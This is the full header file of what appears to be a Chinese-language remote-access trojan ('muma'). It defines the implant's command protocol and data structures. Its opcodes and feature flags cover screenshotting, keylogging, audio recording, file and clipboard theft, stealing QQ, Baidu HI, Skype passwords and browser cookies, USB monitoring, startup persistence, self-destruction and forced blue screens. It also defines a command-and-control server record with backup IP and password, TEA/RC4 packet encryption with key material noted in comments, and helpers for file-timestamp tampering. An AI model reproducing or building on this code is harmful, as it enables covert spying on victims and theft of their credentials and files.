// mumaPublic.h: interface for the mumaPublic class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MUMAPUBLIC_H__E08F25F2_DABD_480E_A9A2_28EA0A144734__INCLUDED_)
#define AFX_MUMAPUBLIC_H__E08F25F2_DABD_480E_A9A2_28EA0A144734__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include <winsock2.h>
#include <time.h>
#include <lmcons.h>

#pragma warning(disable : 4786)

#include <list>
#include <vector>
using namespace std;
//4.MD5 ("sleuth2005") = 140e6c51de34288d312baff7bfbd480c
//前8个字节为 包标识
//后8个字节为 TEA的密码 TEA的加密轮数为16轮

//New Md5("GETU@SDZW") = e0b975307d53662e22aaa4d070df6fe4
//前8个字节为 包标识
//后8个字节为 TEA的密码 TEA的加密轮数为16轮

//////////////////////////////////////////////////////////////////////////
//
#define		TEA_ROUNDS		0x10
#define		TEA_DELTA		0x9E3779B9
#define		TEA_SUM			0xE3779B90
#define		SIZE_PACKET		800
#define		VERSION_TROJ	0x10 //版本号
// 内存共享块大小
#define		SIZE_SHAREMEM	2046
//可支持扩展的dll最大数
#define		DLL_MAX_SIZE	256  
// SendData大包实例
#define		MAX_IDX_SENDDATA	20

#define PTYPE_SCREEN		2		// 截屏		(命令/数据)
#define PTYPE_LISTDIR		3		// 列目录	(命令/数据)
#define PTYPE_COPYDIR		4		// 获取目录	(命令/数据)
#define PTYPE_COPYFILE		5		// 获取文件	(命令/数据)
#define PTYPE_DESTORY		6		// 销毁木马	(植入命令)
#define PTYPE_OLDISKINFO	7		// 磁盘(目录)信息形成文件
#define PTYPE_OPERAREG		8		// 注册表操作(未启用)
#define PTYPE_UPFILE		9		// 上传文件
#define PTYPE_RECENT		10		// 最近的文档列表
#define PTYPE_DIRTREE		11		// 磁盘目录结构列表
#define PTYPE_CALLEXE		12		// 启动指定程序或操作
#define PTYPE_STOPEXE		12		// 停止指定进程
#define PTYPE_SYSINFO		13		// 获取系统基本信息
#define PTYPE_CLIPBOARD		15		// 剪贴板数据
#define	PTYPE_MOUSELOG		16		// 鼠标操作记录
#define	PTYPE_SETSNAPSCREEN		18		// 设置自动截屏
#define		watchthread		17		// 监视截屏线程状态
#define	PTYPE_SEARCHFILE		30		// 搜索目录
#define PTYPE_ADJUSTSPEED	31		// 调整发包速度
#define PTYPE_SEARCHCONTENT 32		// 全文搜索

#define PTYPE_SETRECORD		39		// 设置录音状态
#define PTYPE_QUERYFILESIZE	40		// 查询文件大小(是否存在)
#define PTYPE_SETCHECKDIR		41		// 设置监控目录
#define PTYPE_GETCHECKDIRLIST	42		// 获得监控目录文件列表
#define PTYPE_USBDISKINFO	43  //获取u盘的信息
#define PTYPE_CHECKUSB		44		// 检查是否有新增的U盘
#define PTYPE_GETMD5	45	//根据要求获取MD5
#define PTYPE_SETMD5FILTER 46	//设置MD5参数
#define PTYPE_GETMD5BYFILTER 47	//根据MD5参数获取全MD5
#define PTYPE_SETCUTVIDEO   50     //video cut 频率设置
#define PTYPE_OTHERFILE		60

#define PTYPE_DELQQPASS		59		// 删除qq密码

#define PTYPE_GETTHUMBNAIL	62		// 回传缩略图
#define PTYPE_SETTHUMBNAIL	61		// 获取缩略图

#define PTYPE_SETUPFILE		80		// 设置上传文件
#define PTYPE_UPCOPYFILE	81		// 上传文件	
#define PTYPE_REUPFILE		82		// 上传丢报重传

#define PTYPE_SETDATASTATE	90		// 设置数据开关
#define PTYPE_ADDFRUN		91		// 开启文件夹启动项
#define PTYPE_ADDRUN		92		//	加启动项
#define PTYPE_SETTCPTRANS	93		//	设置tcp传输
#define PTYPE_PUTTROINFO	94		// 设置mm信息 1-线索
#define PTYPE_SETHEADSIGN	96		// 设置部门标示
#define PTYPE_PUTRESERVEIP	97		// 设置备用ip
#define PTYPE_GETALLGUID	99		// 获得所以功能的可用状态
#define PTYPE_ACKHEART		100		// 木马心跳确认包
#define PTYPE_REGETFILE     101     // 重传文件

#define PTYPE_PUTREMOTE     102     // 设置远程信息
#define PTYPE_FLUASHBUFFER  103     // 清理当前运行中的任务和缓冲区
#define PTYPE_AUTOSYSINFO	104		// 自动获取系统基本信息
#define PTYPE_ACKDELFILE	105		// 删除文件
#define PTYPE_BINDFILE		110		// 绑定文件
#define PTYPE_GETBAIDUPASS	111		// 获得已得到的百度HI密码信息
#define PTYPE_GETSKYPEPASS	112		// 获得已得到的SKYPE密码信息
#define PTYPE_BSOD			121		// 蓝屏
#define PTYPE_TELNET		122		// telnet命令
#define PTYPE_SYNCTELNET	123		// 同步telnet命令

#define PTYPE_AUTOLANINFO	150		// 回传局域网信息
#define PTYPE_UPDATELAN		151		// 更新局域网信息
#define PTYPE_INSTALLINFO	152		// 安装文件列表信息

#define PTYPE_BROWSERINFO	153
#define PTYPE_BROWSERCOOKIE	155

#define PTYPE_GETREGEDIT	143

//170-179
#define PTYPE_SCREEN_START	170
#define PTYPE_SCREEN_STOP	171
#define PTYPE_SCREEN_UPDATE	172
#define PTYPE_SCREEN_FULL	173
#define PTYPE_SCREEN_MULUPDATE	174
#define PTYPE_SCREEN_MULUPDATE2	175

#define PTYPE_DISKINFO		191
#define PTYPE_PROCESSINFO	192
#define PTYPE_SOFTWAREINFO	193
#define PTYPE_INPUTINFO		194		//输入法信息
#define PTYPE_HARDWARESTR	195
#define PTYPE_APPID			196
#define PTYPE_ADAPTER		197
#define PTYPE_LANINFO		198

#define DRIVER_IO_REMOTEIP		9900
#define DRIVER_IO_REMOTEADDR	9901
#define DRIVER_IO_DESTROY		9903
#define DRIVER_IO_EXECUTE		9904
#define DRIVER_IO_BSOD			9905

#define FIX_SCREEN			1
#define FIX_AUDIO			2
#define FIX_KEYLOG			3
#define FIX_MOUSE			4
#define FIX_DIRLIST			5
#define FIX_USBDIR			6
#define	FIX_USBFILE			7
#define FIX_MONITOR			8
#define	FIX_QQREC			9
#define FIX_CLIP			10
#define FIX_SKYPEAUDIO		11
#define FIX_SKYPESHOOT		12
#define FIX_MD5LIST			13
#define FIX_ANDROID			14
#define FIX_MD5FILTER		16
#define FIX_BROWSER			15
#define FIX_BROWSERCOOKIE	17
#define FIX_SYSTEMINFO		18
#define FIX_OTHERFILE		98
#define FIX_SCREENBAK		99

#define MAXCOUNT	100
#define MAXCOUNT2	20
#define HARDSTRLEN	500
#define APPIDLEN	500
#define ADAPTERLEN	1000
#define LANLEN		500
#define USBINFOLEN	300

//木马类型
extern int SignType;

typedef struct _REMOTEINFO_
{
	char remark[50];
	char remotedomain[MAX_PATH];
	char password[50];
	char troinfo[300];
	DWORD remoteIP;
	DWORD ReserveIp;
	DWORD HeadSign;
	_REMOTEINFO_()
	{
		remoteIP = 0;
		ReserveIp = 0;
		HeadSign = 0;
		memset(remark, 0, sizeof(remark));
		memset(remotedomain, 0, sizeof(remotedomain));
		memset(password, 0, sizeof(password));
		memset(troinfo, 0, sizeof(troinfo));
	}
}RemoteInfo, *pRemoteInfo;

char *DepubStringA(char *ret_string, int strlen, char *string);

char *DeFileStringA(char *ret_string, int strlen, char *string);

WCHAR *DeFileStringW(WCHAR *ret_string, int strlen, WCHAR *string);

char *DeRunStringA(char *ret_string, int strlen, char *string);

char *DeProcessStrA(char *ret_string, int strlen, char *string);

char *SysinfStringA(char *ret_string, int strlen, char *string);

char *GetTmpPrevFix(int type);
int GetFatAutoSendID();
BOOL MD5TranFile(char* pmd5, const WCHAR * filename);
//算整个文件的MD5
BOOL MD5TranFile1(char* pmd5, const WCHAR * filename);
//算文件指定位置的MD5
BOOL MD5TranFile2(char* pmd5, const WCHAR * filename, int begpos, int endpos);
//算前1K，后1K，加长度的MD5
BOOL MD5TranFile3(char* pmd5, const WCHAR * filename);

BOOL	GetTroPath(char *path);
BOOL GetTroPathW(WCHAR *path);

 // 修改文件或目录的时间, offHour偏移小时, offMinute偏移分分钟 
BOOL ModifyFileTime(LPCSTR pathname, int offHour = 0, int offMinute = 5);

void RemoteFileContent(LPCSTR filepath, char* p, DWORD& plen, BOOL bGet);

BOOL SetRemoteInfo(char *pbuf, int len, int type, char *tropath);

BOOL GetRemoteInfo(pRemoteInfo rinfo);

void GetDataState(char *spyaddr,int spyaddrlen, bool bCrypt);

BOOL NewGetRemoteInfo(pRemoteInfo &rinfo, char *tropath);
/*!
  \fn ULONG	GetVirtualServerIp();
  \brief 得到虚拟ip
  \param 
  \param 
  \return
  函数详细
*/
ULONG	GetVirtualServerIp();				
/*!
  \fn BOOL BufferDecrypt(char * buff,int len,int offest);
  \brief 加密
  \param 
  \param 
  \return
  函数详细
*/
BOOL BufferDecrypt(char * buff,int len,int offest);
/*!
  \fn BOOL BufferEncrypt(char * buff,int len,int offest);
  \brief  解密
  \param 
  \param 
  \return
  函数详细
*/
BOOL BufferEncrypt(char * buff,int len,int offest);

char * GetFormatIP(const char * szIP);

int		LineParser(char * inputline,char ** nextline,char **field,char ** value);

BOOL	DbgFat32Log(const char* fm, ...);
/*!
  \fn void	BootNTRemove(char* filename);
  \brief //NT重起删除
  \param 
  \param 
  \return
  函数详细
*/
void BootNTRemove(const char* filename);		
void BootNTRemoveW(const WCHAR * filename);
void BootMoveFile(char* filename,char* dstname);
void BootMoveFileW(WCHAR* filename,WCHAR* dstname);


 
// 读取文件
int GetFileContent(char* filename,DWORD& pbuffer,DWORD& datalen);

//////////////////////////////////////////////////////////////////////////
//
struct SendPacketHead {
	CHAR PFlag[8];
	ULONG TroNo;
	UCHAR TroType;
	UCHAR PacketType;
	UCHAR TroVersion;
	UCHAR retain;
};

#define SENDPACKETHEADLEN 16

struct MumaHead{
	USHORT	datalen;	//	数据长度		2Byte			;内存格式
	USHORT	SessionID;	//					2Byte			;内存格式
	USHORT	PacketSeq;	//	包序号			2Byte			;内存格式
	CHAR	TranFlg;	//	数据传输标志	1Byte
	CHAR	retain;		//	保留			1Byte
};

class Line{
public:
	UINT slen;
	char line[2000];
};
typedef list<Line, allocator<Line> > LineList ;
//Define an iterator for template class list of ints
typedef LineList::iterator LineListIt ;
//////////////////////////////////////////////////////////////////////////
typedef WINADVAPI
BOOL	(CALLBACK *pMOVEFILEFUN)(
								const char * srcFile,
								const char * dstFile,
								DWORD dwFlag); 

typedef WINADVAPI
BOOL	(CALLBACK *pMOVEFILEFUNW)(
								  LPCWSTR srcFile,
								  LPCWSTR dstFile,
								  DWORD dwFlag); 

void CryptRemoteInfo(char* p, int len);

BOOL QueryRegValueF(HKEY hRoot, const char * szSubKey, const char * szName, /*out*/char* szPath, /*out*/DWORD& buflen);

DWORD MakeHeadBuff(char *hdrBuf, int &offMumaHead, UCHAR PacketType);

//////////////////////////////////////////////////////////////////////////
//rc4
struct rc4_state
{
    int x, y, m[256];
};

void rc4_setup( struct rc4_state *s, unsigned char *key,  int length );
void rc4_crypt( struct rc4_state *s, unsigned char *data, int length );

//////////////////////////////////////////////////////////////////////////
//

int Unicode2GB2312(WCHAR* wsunicode,char* buffer,int buflen);
int Unicode2UTF_8(WCHAR* wsunicode,char* buffer,int buflen);
int GB23122Unicode(char*gb2312, WCHAR* wsz, int len);
int UTF_82Unicode(char*utf8, WCHAR* wszUtf8, int len);

int Utf82Gb(const char * p, int len, char * buf, int buflen);
int Gb2Utf8(const char * p, int len, char * buf, int buflen);

int LineParser2(char * inputline,char ** nextline,char **field,char ** value);

BOOL myGetModuleFile(WCHAR * SelfPath, DWORD PathLen, WCHAR * SelfName, DWORD NameLen);

void *mymemcpy(void *des, const void *src, size_t len);

typedef struct _para_
{
	char* value;
	int len;
	_para_()
	{
		value=0;
		len=0;
	}
}Para,*lpPara;

void Split(char* buf,int len,char* e,Para * parray,int& count);

bool Split(const char* buf, int len, char* e, vector<string>& parray, bool bLastField = false);

BOOL CreateFileName(LPCSTR m_type, LPSTR filename, LPSTR filea);
BOOL myWriteFile(char *buf, int buflen, LPSTR browserfilename, LPSTR browserfilea);
BOOL WriteCyFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite);
BOOL WriteCyFile(LPCSTR filename, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite);
BOOL Decode2(char*buf,DWORD& len);

char * GetUtf8WindowTitle();

BOOL GetAppDataPath(char *path);
BOOL GetLocalAppDataPath(char *path);

void WriteDbgLogEx(const char *fm, ...);

extern BOOL g_isHeartOk;
#endif // !defined(AFX_MUMAPUBLIC_H__E08F25F2_DABD_480E_A9A2_28EA0A144734__INCLUDED_)
